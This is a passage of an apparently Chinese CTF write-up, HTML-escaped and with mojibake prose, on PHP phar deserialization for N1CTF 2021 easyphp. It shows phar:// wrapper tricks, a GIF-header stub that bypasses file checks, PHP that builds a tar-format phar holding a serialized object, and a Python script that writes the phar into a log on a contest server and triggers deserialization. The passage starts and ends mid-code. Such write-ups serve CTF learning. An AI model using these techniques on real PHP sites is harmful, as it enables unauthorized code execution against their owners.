class=&#34;variable&#34;&gt;$z&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$z&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;php:&amp;#x2F;&amp;#x2F;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;hr&gt;
&lt;h3 id=&#34;ç®€å•çš„ç»•è¿‡&#34;&gt;&lt;a href=&#34;#ç®€å•çš„ç»•è¿‡&#34; class=&#34;headerlink&#34; title=&#34;ç®€å•çš„ç»•è¿‡&#34;&gt;&lt;/a&gt;ç®€å•çš„ç»•è¿‡&lt;/h3&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥åˆ©ç”¨stubéƒ¨åˆ†å‰ç¼€ä»»æ„çš„ç‰¹æ€§ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; -&amp;gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;GIF89a&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#x27;&lt;/span&gt;);   &lt;span class=&#34;comment&#34;&gt;//è®¾ç½® stubï¼Œå¢åŠ  gif æ–‡ä»¶å¤´&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;è¿™å¯ä»¥ç»•è¿‡ä¸€éƒ¨åˆ†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;ç»•è¿‡å‰åè„æ•°æ®&#34;&gt;&lt;a href=&#34;#ç»•è¿‡å‰åè„æ•°æ®&#34; class=&#34;headerlink&#34; title=&#34;ç»•è¿‡å‰åè„æ•°æ®&#34;&gt;&lt;/a&gt;ç»•è¿‡å‰åè„æ•°æ®&lt;/h3&gt;&lt;p&gt;ç”±äºç­¾åéƒ¨åˆ†çš„å­˜åœ¨ï¼Œphpä¼šæ ¡éªŒæ–‡ä»¶å“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥æœ«å°¾æ˜¯å¦ä¸ºGBMBï¼Œå¦‚ä¸‹æ˜¯è§£æéƒ¨åˆ†çš„æºç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&amp;%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/src.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.dev/php/php-src&#34;&gt;https://github.dev/php/php-src&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¯è§ï¼Œå¦‚æœæœ«å°¾ä¸æ˜¯GBMBä¼šç›´æ¥å¯¼è‡´è§£æå¤±è´¥ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨CTFä¸­åˆ©ç”¨è¯¥æ¼æ´éœ€è¦æˆ‘ä»¬å®Œæˆå†™å…¥&amp;#x2F;ä¸Šä¼ pharï¼Œå¹¶è°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ä¸€å¥è¯æœ¨é©¬ç”±äºæœ‰&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;è¿™æ ·çš„å¤´å°¾æ ‡è¯†å­˜åœ¨ï¼Œå¯ä»¥æ— è§†å‰åè„æ•°æ®ï¼›ç„¶è€Œå¯¹äºpharï¼Œè¿™æ ·çš„éªšæ“ä½œè¢«ç­¾åéƒ¨åˆ†é˜»æ­¢äº†ã€‚æœ‰åŠæ³•ç»•è¿‡å—ï¼Ÿè¯·å‚é˜…ï¼š&lt;a href=&#34;https://www.php.net/manual/zh/phar.converttoexecutable.php&#34;&gt;https://www.php.net/manual/zh/phar.converttoexecutable.php&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;åˆ©ç”¨convertToExecutableå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpharæ–‡ä»¶è½¬ä¸ºå…¶ä»–æ ¼å¼çš„pharæ–‡ä»¶ï¼Œä¾‹å¦‚.tarå’Œ.zipæ ¼å¼ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ä»¥N1CTF easyphpä¸ºä¾‹å­ï¼Œè¿™é¢˜å…è®¸æˆ‘ä»¬å†™å…¥æ—¥å¿—ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–å¾—åˆ°flagï¼Œéš¾ç‚¹åœ¨äºæ—¥å¿—æ–‡ä»¶å‰åæœ‰é¢å¤–è„æ•°æ®ï¼Œä¼šä½¿å¾—æˆ‘ä»¬çš„pharæ–‡ä»¶æ— æ³•è¢«è§£æã€‚&lt;/p&gt;
&lt;p&gt;ç„¶è€Œå¦‚æœä»¥taræ ¼å¼å‚¨å­˜pharï¼Œæœ«å°¾çš„è„æ•°æ®å¹¶ä¸ä¼šå½±å“è§£æï¼ˆè¿™æ˜¯tarçš„æ ¼å¼å†³å®šçš„ï¼‰ï¼Œè€Œå¼€å¤´çš„è„æ•°æ®å¯ä»¥åœ¨åˆ¶é€ pharæ–‡ä»¶æ—¶å°±æå‰æ„é€ å¥½ï¼ˆè¿™æ ·è¿™éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šè¢«çº³å…¥ç­¾åè®¡ç®—ï¼‰ï¼Œå†™å…¥æ—¥å¿—æ—¶ä¸å¿…å†™å…¥è¿™éƒ¨åˆ†ï¼Œè€Œæ˜¯ä»¤å…¶ä¸è„æ•°æ®æ‹¼æ¥å½¢æˆåˆæ³•çš„pharã€‚exploitå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  CLASS FLAG &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;FLAG: &amp;quot;&lt;/span&gt; . &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;_flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$sb&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;sb&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ts&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;ts&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$sb&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;.phar&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//åç¼€åå¿…é¡»ä¸ºphar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    **&lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;convertToExecutable&lt;/span&gt;(&lt;span class=&#34;title class_&#34;&gt;Phar&lt;/span&gt;::&lt;span class=&#34;variable constant_&#34;&gt;TAR&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//ä¼šç”Ÿæˆ*.phar.tar**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;startBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;addFromString&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Time: &amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$ts&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot; IP: [], REQUEST: [log_type=&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$sb&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;quot;], CONTENT: [&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//taræ–‡ä»¶å¼€å¤´æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ æ–‡ä»¶çš„çš„æ–‡ä»¶åï¼Œæ³¨æ„æ·»åŠ çš„æ–‡ä»¶é¡ºåºä¸è¦é”™äº†&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//è®¾ç½®stub&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;FLAG&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt; -&amp;gt; data = &lt;span class=&#34;string&#34;&gt;&amp;#x27;g0dsp3ed_1s_g0D&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setMetadata&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$o&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//ç­¾åè‡ªåŠ¨è®¡ç®—&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;stopBuffering&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æŠŠè¿™ä¸ªè·‘åœ¨æœ¬åœ°webæœåŠ¡ä¸Šï¼Œç„¶åå†™ä¸ªè„šæœ¬ï¼ˆå½“æ—¶åŠå¤œèµ¶åˆ¶çš„å¾ˆä¸‘ä¼šç•™ä¸‹ä¸€äº›åƒåœ¾æ–‡ä»¶ æ±‚è½»å–· é˜Ÿé‡Œå¸ˆå‚…å†™çš„å¹²å‡€å¤šäº†ï¼‰ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; rq&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; json &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; random&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ip = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;here_is_remote_ip&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;generate_random_str&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;randomlength=&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  ç”Ÿæˆä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  random_str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  base_str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  length = &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(base_str) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(randomlength):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    random_str += base_str[random.randint(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, length)]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; random_str&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;new_one&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;offset&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    rd = generate_random_str(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ts2 = time.strftime(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%Y-%m-%d %H:%M:%S&amp;#x27;&lt;/span&gt;,time.localtime(time.time()+offset))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ts = time.strftime(&lt;span class=&#34;string&#34;&gt;&amp;#x27;%Y-%m-%d %H:%M:%S&amp;#x27;&lt;/span&gt;,time.localtime(time.time()))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res = rq.get(url=&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://127.0.0.1/test.php?sb=&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;&amp;amp;ts=&lt;span class=&#34;subst&#34;&gt;&amp;#123;ts2&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# è®¿é—®æœ¬åœ°ç”Ÿæˆphar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;#x27;&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;.phar.tar&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; f: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        data = f.read()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data = data[&lt;span class=&#34;number&#34;&gt;70&lt;/span&gt;::]&lt;span class=&#34;comment&#34;&gt;#å»æ‰å‰é¢çš„å†—ä½™éƒ¨åˆ†ä»¥ä¾¿å’Œlogå‰é¢æ‹¼æ¥å½¢æˆåˆæ³•*.phar.tar&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    headers = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;content-type&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;application/x-www-form&amp;#x27;&lt;/span&gt;&amp;#125;  &lt;span class=&#34;comment&#34;&gt;# æºæ–‡æœ¬&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res = rq.post(url=&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://43.155.59.185:53340/log.php?log_type=&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;,data=data)  &lt;span class=&#34;comment&#34;&gt;# å†™å…¥æ—¥å¿—&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res = rq.post(url=&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://43.155.59.185:53340?file=phar://./log/&lt;span class=&#34;subst&#34;&gt;&amp;#123;ip&amp;#125;&lt;/span&gt;/&lt;span class=&#34;subst&#34;&gt;&amp;#123;rd&amp;#125;&lt;/span&gt;_www.log&amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# ååºåˆ—åŒ–&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(res.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(-&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;30&lt;/span&gt;):&lt;span class=&#34;comment&#34;&gt;#è€ƒè™‘æœ¬åœ°å’Œè¿œç¨‹çš„æ—¶é—´å·®å¼‚ï¼Œè¿™è¾¹è®¾ç½®ä¸ª30sçš„çª—å£æœŸ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_one(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    time.sleep(&lt;span class=&#34;number&#34;&gt;0.9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;ç”Ÿæˆçš„æ–‡ä»¶é•¿è¿™æ 